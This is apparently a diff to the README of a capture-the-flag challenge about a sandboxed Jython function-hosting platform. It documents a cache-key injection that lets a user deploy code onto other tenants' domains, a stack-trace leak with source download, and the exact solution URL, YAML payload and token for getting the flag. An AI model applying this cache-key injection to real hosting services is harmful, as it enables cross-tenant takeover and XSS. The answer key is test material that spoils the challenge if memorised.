@@ -9,7 +9,7 @@ The environment is sandboxed.
 ## Jython
 
 Because of CPython's GIL lock, users can easily DOS the system by having a syscall that takes forever to run.
-We use Jython here to have true multithreading.
+We use Jython here to have real multithreading.
 
 ## How-To
 
@@ -35,9 +35,12 @@ default_handler: |-
   uae_rsp = uaeutils.errorpage("The requested URL %s was not found on this server." % request['path'], code=404)
 ```
 
+## Source Code Download
+Trigger an exception in your python code (e.g. for above, visit `/add?a=1&b=lol`), there will be debug info (stack trace) as well as code download link.
+
 ## Vulnerability
 
-Could deploy functions to any domains due to wrong caching rules.
+Could deploy functions to any domains by injecting caching keys.
 
 **Normal User**
 Domain: example
@@ -51,22 +54,29 @@ Path: lmao
 
 Cache Key: example.unhackable.app/haha.unhackable.app/lmao
 
-**This would make XSS possible on all GAE apps**
+**This would make XSS possible on all UAE apps**
 
-## Payload
+## Flag
 
-Visit https://manage.unhackable.app/edit?app=example.unhackable.app/haha
+Visit https://manage.unhackable.app/edit?app=otp.unhackable.app/adamyi
 
 ```
 ---
+---
 urls:
-  "/test": |-
-    uae_rsp = uaeutils.make_response("hacked")
+  "/": |-
+    uae_rsp = uaeutils.make_response("uh4SGbRbgQCPHnieb2jM1U3BsYZniZmD")
 default_handler: |-
   uae_rsp = uaeutils.errorpage("The requested URL %s was not found on this server." % request['path'], code=404)
 ```
 
-https://test1.unhackable.app/haha.unhackable.app:8056/test becomes hacked
+https://otp.unhackable.app/adamyi.unhackable.app/ becomes `uh4SGbRbgQCPHnieb2jM1U3BsYZniZmD`
+
+Use this URL for https://manage.unhackable.app/flag to get flag.
+
+## TODO
+
+Better documentation and examples on unhackable.app so that users know what UAE is and how to deploy their apps
 
 ## author
 adamyi
